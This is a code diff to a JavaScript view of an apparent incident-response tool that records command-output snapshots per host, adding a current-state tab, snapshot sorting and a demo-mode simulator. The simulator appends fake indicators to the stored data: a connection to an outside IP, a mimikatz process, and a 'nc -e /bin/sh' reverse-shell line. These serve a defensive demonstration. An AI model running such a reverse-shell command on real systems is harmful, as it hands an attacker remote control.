@@ -1,4 +1,4 @@
-import { saveEngagementData, saveSnapshots, newSnapshot, newNote } from '../data/index.js';
+import { saveEngagementData, saveSnapshots, newSnapshot, newNote, isMockMode } from '../data/index.js';
 import { btn } from '../ui/elements.js';
 import { toastSuccess, toastError } from '../ui/toast.js';
 import { detectOS, detectCommand,
@@ -12,7 +12,8 @@ export function renderHost(engagementId, hostId, data, snapshots, onBack) {
   const host = data.hosts.find(h => h.id === hostId);
   if (!host) { onBack(); return; }
 
-  let activeTab = 'snapshots';
+  let activeTab = 'current';
+  let snapSort  = 'time'; // 'time' | 'type'
 
   render();
 
@@ -66,6 +67,12 @@ export function renderHost(engagementId, hostId, data, snapshots, onBack) {
     addNoteBtn.onclick = () => { activeTab = 'notes'; showNoteForm(); };
 
     headerActions.appendChild(statusBadge);
+    if (isMockMode()) {
+      const simBtn = btn('⚡ Simulate', 'ghost');
+      simBtn.title = 'Inject a simulated new snapshot to demo diff highlighting';
+      simBtn.onclick = () => simulateNewData(hostSnaps);
+      headerActions.appendChild(simBtn);
+    }
     headerActions.appendChild(addNoteBtn);
     headerActions.appendChild(addSnapBtn);
     header.appendChild(headerActions);
@@ -106,24 +113,28 @@ export function renderHost(engagementId, hostId, data, snapshots, onBack) {
     const tabBar = document.createElement('div');
     tabBar.className = 'flex gap-1 border-b border-slate-200 mb-4';
 
-    ['snapshots', 'notes'].forEach(tab => {
+    [
+      { id: 'current',   label: 'Current State' },
+      { id: 'snapshots', label: `Snapshots (${hostSnaps.length})` },
+      { id: 'notes',     label: `Notes (${hostNotes.length})` },
+    ].forEach(({ id, label }) => {
       const t = document.createElement('button');
       t.type = 'button';
       t.className = `px-4 py-2 text-sm font-medium border-b-2 -mb-px transition-colors ${
-        activeTab === tab
+        activeTab === id
           ? 'border-indigo-600 text-indigo-600'
           : 'border-transparent text-slate-500 hover:text-slate-700'
       }`;
-      t.textContent = tab === 'snapshots'
-        ? `Snapshots (${hostSnaps.length})`
-        : `Notes (${hostNotes.length})`;
-      t.onclick = () => { activeTab = tab; render(); };
+      t.textContent = label;
+      t.onclick = () => { activeTab = id; render(); };
       tabBar.appendChild(t);
     });
     container.appendChild(tabBar);
 
     // ── Tab content ───────────────────────────────────────
-    if (activeTab === 'snapshots') {
+    if (activeTab === 'current') {
+      renderCurrentTab(hostSnaps);
+    } else if (activeTab === 'snapshots') {
       renderSnapshotsTab(hostSnaps);
     } else {
       renderNotesTab(hostNotes);
@@ -141,8 +152,8 @@ export function renderHost(engagementId, hostId, data, snapshots, onBack) {
       return;
     }
 
-    hostSnaps.forEach((snap, i) => {
-      const prevSnap = hostSnaps.find((s, j) => j > i && s.commandType === snap.commandType);
+    function renderSnapCard(snap, i, snapsArray) {
+      const prevSnap = snapsArray.find((s, j) => j > i && s.commandType === snap.commandType);
       const diff = prevSnap ? diffSnapshots(prevSnap, snap) : null;
       const hasChanges = diff && (diff.added?.length || diff.removed?.length);
 
@@ -222,7 +233,47 @@ export function renderHost(engagementId, hostId, data, snapshots, onBack) {
       card.appendChild(rawEl);
 
       container.appendChild(card);
-    });
+    }
+
+    // Sort toggle
+    const sortBar = document.createElement('div');
+    sortBar.className = 'flex items-center gap-2 mb-4';
+    const sortLabel = document.createElement('span');
+    sortLabel.className = 'text-xs text-slate-500 font-medium';
+    sortLabel.textContent = 'Sort:';
+    sortBar.appendChild(sortLabel);
+    for (const [val, label] of [['time', 'By time'], ['type', 'By type']]) {
+      const b = document.createElement('button');
+      b.type = 'button';
+      b.textContent = label;
+      b.className = `text-xs px-2.5 py-1 rounded border ${snapSort === val ? 'bg-indigo-600 text-white border-indigo-600' : 'bg-white text-slate-600 border-slate-200 hover:border-slate-400'}`;
+      b.onclick = () => { snapSort = val; render(); };
+      sortBar.appendChild(b);
+    }
+    container.appendChild(sortBar);
+
+    if (snapSort === 'type') {
+      // Group by commandType
+      const groups = {};
+      for (const snap of hostSnaps) {
+        (groups[snap.commandType] ||= []).push(snap);
+      }
+      // Sort group keys by most recent snap in each group
+      const sortedTypes = Object.keys(groups).sort(
+        (a, b) => groups[b][0].timestamp - groups[a][0].timestamp
+      );
+      for (const type of sortedTypes) {
+        const groupSnaps = groups[type];
+        const heading = document.createElement('p');
+        heading.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2 mt-4 first:mt-0';
+        heading.textContent = `${type}  (${groupSnaps.length})`;
+        container.appendChild(heading);
+        groupSnaps.forEach((snap, i) => renderSnapCard(snap, i, groupSnaps));
+      }
+      return;
+    }
+
+    hostSnaps.forEach((snap, i) => renderSnapCard(snap, i, hostSnaps));
   }
 
   // ── Notes tab ─────────────────────────────────────────
@@ -428,6 +479,117 @@ export function renderHost(engagementId, hostId, data, snapshots, onBack) {
     backdrop.onclick = e => { if (e.target === backdrop) backdrop.remove(); };
     document.body.appendChild(backdrop);
     textarea.focus();
+  }
+
+  // ── Current State tab ──────────────────────────────────
+
+  function renderCurrentTab(hostSnaps) {
+    if (hostSnaps.length === 0) {
+      const empty = document.createElement('p');
+      empty.className = 'text-slate-400 text-sm text-center py-12';
+      empty.textContent = 'No snapshots yet. Click "+ Snapshot" to paste command output.';
+      container.appendChild(empty);
+      return;
+    }
+
+    // One card per commandType, ordered by security relevance
+    const ORDER = ['netstat','pslist','localadmins','shadow','whoami','sudol','sessions',
+                   'passwd','netaccounts','netshare','lastlog','ipconfig','uname','arp','netuser'];
+    const latest = {};
+    for (const snap of hostSnaps) {
+      if (!latest[snap.commandType]) latest[snap.commandType] = snap;
+    }
+    const types = [
+      ...ORDER.filter(t => latest[t]),
+      ...Object.keys(latest).filter(t => !ORDER.includes(t)),
+    ];
+
+    for (const type of types) {
+      const snap = latest[type];
+      const card = document.createElement('div');
+      card.className = 'bg-white rounded-xl border border-slate-200 p-4 mb-3';
+
+      const cardHeader = document.createElement('div');
+      cardHeader.className = 'flex items-center gap-2 mb-3';
+
+      const cmdBadge = document.createElement('span');
+      cmdBadge.className = 'inline-flex items-center px-2 py-0.5 rounded text-xs font-mono font-semibold bg-indigo-100 text-indigo-700';
+      cmdBadge.textContent = type;
+
+      const osBadge = document.createElement('span');
+      osBadge.className = 'inline-flex items-center px-2 py-0.5 rounded text-xs bg-slate-100 text-slate-600';
+      osBadge.textContent = snap.osFamily;
+
+      const ts = document.createElement('span');
+      ts.className = 'text-xs text-slate-400 ml-auto';
+      ts.textContent = new Date(snap.timestamp).toLocaleString();
+
+      const viewBtn = document.createElement('button');
+      viewBtn.type = 'button';
+      viewBtn.className = 'text-xs text-indigo-500 hover:text-indigo-700 ml-2';
+      viewBtn.textContent = 'history →';
+      viewBtn.onclick = () => { activeTab = 'snapshots'; snapSort = 'type'; render(); };
+
+      cardHeader.appendChild(cmdBadge);
+      cardHeader.appendChild(osBadge);
+      cardHeader.appendChild(ts);
+      cardHeader.appendChild(viewBtn);
+      card.appendChild(cardHeader);
+
+      if (snap.parsed) {
+        renderParsedBody(card, snap);
+      } else {
+        const na = document.createElement('p');
+        na.className = 'text-xs text-slate-400 italic';
+        na.textContent = 'No parsed data.';
+        card.appendChild(na);
+      }
+
+      container.appendChild(card);
+    }
+  }
+
+  // ── Simulate new data (mock/demo mode only) ────────────
+
+  function simulateNewData(hostSnaps) {
+    const netstatSnap = hostSnaps.find(s => s.commandType === 'netstat');
+    const pslistSnap  = hostSnaps.find(s => s.commandType === 'pslist');
+
+    if (!netstatSnap && !pslistSnap) {
+      toastError('Need at least one netstat or pslist snapshot to simulate from.');
+      return;
+    }
+
+    const newSnaps = [];
+
+    if (netstatSnap) {
+      const line = host.osFamily === 'windows'
+        ? `\n  TCP    ${host.ip}:49712      185.220.101.34:443     ESTABLISHED`
+        : `\ntcp        0      0 ${host.ip}:49712   185.220.101.34:443   ESTABLISHED`;
+      const raw    = netstatSnap.rawOutput + line;
+      const parsed = parseNetstat(raw, host.osFamily);
+      newSnaps.push(newSnapshot({ hostId, commandType: 'netstat', osFamily: host.osFamily, rawOutput: raw, parsed }));
+    }
+
+    if (pslistSnap) {
+      const line = host.osFamily === 'windows'
+        ? '\nmimikatz.exe                 4444   4780'
+        : '\nwww-data  9988  0.0  0.0  4196  1024 pts/2    S    14:22   0:00 nc -e /bin/sh 185.220.101.34 4444';
+      const raw    = pslistSnap.rawOutput + line;
+      const parsed = parsePslist(raw, host.osFamily);
+      newSnaps.push(newSnapshot({ hostId, commandType: 'pslist', osFamily: host.osFamily, rawOutput: raw, parsed }));
+    }
+
+    const updated = [...newSnaps, ...snapshots];
+    saveSnapshots(engagementId, updated)
+      .then(() => {
+        snapshots = updated;
+        activeTab = 'snapshots';
+        snapSort  = 'type';
+        toastSuccess(`Simulated ${newSnaps.length} new snapshot${newSnaps.length !== 1 ? 's' : ''} — diffs highlighted below.`);
+        render();
+      })
+      .catch(e => toastError(e.message || 'Simulation failed.'));
   }
 }
 
